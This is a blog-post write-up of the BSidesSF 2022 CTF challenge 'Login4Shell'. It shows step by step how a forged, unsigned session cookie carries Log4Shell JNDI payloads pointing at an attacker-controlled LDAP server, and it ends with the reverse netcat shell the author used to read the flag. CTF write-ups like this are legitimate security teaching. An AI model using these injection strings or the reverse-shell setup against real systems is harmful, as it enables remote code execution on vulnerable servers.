---
layout: post
title: "BSidesSF 2022 CTF: Login4Shell"
category: Security
date: 2022-06-20
tags:
  - CTF
  - BSidesSF
---

[Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) was arguably the biggest
vulnerability disclosure of 2021.  Security teams across the entire world spent
the end of the year trying to address this bug (and several variants) in the
popular [Log4J](https://logging.apache.org/log4j/2.x/) logging library.

The vulnerability was caused by special formatting strings in the values being
logged that allow you to include a reference.  This reference, it turns out, can
be loaded via `JNDI`, which allows remotely loading the results as a Java class.

This was such a big deal that there was no way we could let the next BSidesSF
CTF go by without paying homage to it.  Fun fact, this meant I "got" to build a
Java webapp, which is actually something I'd never done from scratch before.
Nothing quite like learning about Jetty, Log4J, and Maven just for a CTF level.

<!--more-->

Visiting the given application, we see a basic page with options to login and
register along with a changelog:

![Login4Shell](/img/bsidessf/login4shell_home.png)

The changelog notes that the logger was "patched for Log4Shell" and that there
was previously support for sub-users in the format "user+subuser", but it has
alledgedly been removed.

Registering an account, we're requested to provide only a username.  The
password is given to us once we register.  Registering the username "writeup",
we get the password "7fAFsdYlz-oH".  If we login with these credentials, we now
see a link to a page called "Flag", as well as a "Logout" link.  Could we just
get the flag directly?  Let's check.

![Login4Shell Flag](/img/bsidessf/login4shell_flag.png)

Unfortunately, no such luck.  We're presented with a page containing the
following:

> Oh come on, it wasn't going to be that simple. We're going to make you work for this.
> 
> The flag is accessible at `/home/ctf/flag.txt`.
> 
> Oh yeah, your effort to get the flag has been logged. Don't make me tell you again.

Noting the combination of the logging bug mentioned on the homepage (and the
hint from the name of the challenge), as well as the message here about being
logged, perhaps this is a place we could do something.  Let's look for anywhere
accepting user input.

Other than the login and register forms, we find nothing interesting across the
entire app.  Attempting to put a log4shell payload into the login and register
forms merely obtains an error:

> Error: Username must be lowercase alphanumeric!

Taking a look at the login process, we see that we get handed a cookie
(`logincookie`) for the session when we login:

```
eyJ1c2VybmFtZSI6IndyaXRldXAiLCJwYXNzd29yZCI6IjdmQUZzZFlsei1vSCJ9
```

It might be an opaque session token, but from experience, I know that `ey` is
the base64 encoding of the opening of a JSON object (`{"`).  Let's decode it and
see what we get:

```
{"username":"writeup","password":"7fAFsdYlz-oH"}
```

Interestingly enough, our session cookie is just a JSON object that contains the
plaintext username and password for our user.  There's no obvious signature or
MAC involved.  Maybe we can tamper directly with the cookie.  If I change the
username by adding a letter, it effectively logs me out.  Likewise, changing the
password gives me the logged-out experience.

Looking back at the "subuser" syntax mentioned on the homepage, I decided to try
that directly with the cookie.  Setting the username to `writeup+a` with the
same password, the site seems to recognize me as logged-in again.  To check if
this field might be vulnerable without needing to setup the full exploit
ourselves, we can use the [Huntress Log4Shell
test](https://log4shell.huntress.com/).  Inserting the provided payload gives us
the following cookie:

```
{"username":"writeup+${jndi:ldap://log4shell.huntress.com:1389/d21b4a24-08c8-4d91-9da3-b12fa5f0a472}","password":"7fAFsdYlz-oH"}
eyJ1c2VybmFtZSI6IndyaXRldXArJHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGwuaHVudHJlc3MuY29tOjEzODkvZDIxYjRhMjQtMDhjOC00ZDkxLTlkYTMtYjEyZmE1ZjBhNDcyfSIsInBhc3N3b3JkIjoiN2ZBRnNkWWx6LW9IIn0=
```

If we set our cookie to that value, then visit the `/flag` page again so our
attempt is logged, we *should* trigger the vulnerability, as we understand it so
far.  Doing so, then refreshing our page on Huntress shows the callback hitting
their server.  We've successfully identified a sink for the log4shell payload!
Now we just need to serve up a payload.

Unfortunately, this requires an internet exposed server.  There's a couple of
ways to do this, such as port forwarding on your router, a service like
[ngrok](https://ngrok.com), or running a VPS/Cloud Server.  In this case, I'll
use a VPS from [Digital Ocean](https://m.do.co/c/b2cffefc9c81).

I grabbed the [`log4j-shell-poc`](https://github.com/kozmer/log4j-shell-poc)
from `kozmer` to launch the attack.  This, itself, depends on the `marshalsec`
project.  This requires exposing 3 ports: LDAP on port 1389, a port for the
reverse shell, and a port for an HTTP server for the payload.  The LDAP server
will point to the HTTP server, which will provide a class file as the payload,
which launches a reverse shell to the final port.  We launch the PoC with our
external IP:

```
python3 ./poc.py --userip 137.184.181.246

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://137.184.181.246:1389/a}
```

After starting a netcat listener on port 9001, we send the provided string in
our username within the cookie and load the flag page again:

```
{"username":"writeup+${jndi:ldap://137.184.181.246:1389/a}","password":"7fAFsdYlz-oH"}
eyJ1c2VybmFtZSI6IndyaXRldXArJHtqbmRpOmxkYXA6Ly8xMzcuMTg0LjE4MS4yNDY6MTM4OS9hfSIsInBhc3N3b3JkIjoiN2ZBRnNkWWx6LW9IIn0=
```

Upon reloading, we see our netcat shell light up:

```
nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 35.247.118.88 36856
id
uid=2000(ctf) gid=2000(ctf) groups=2000(ctf)
cat /home/ctf/flag.txt
CTF{thanks_for_logging_in_to_our_logs_login_shell}
```
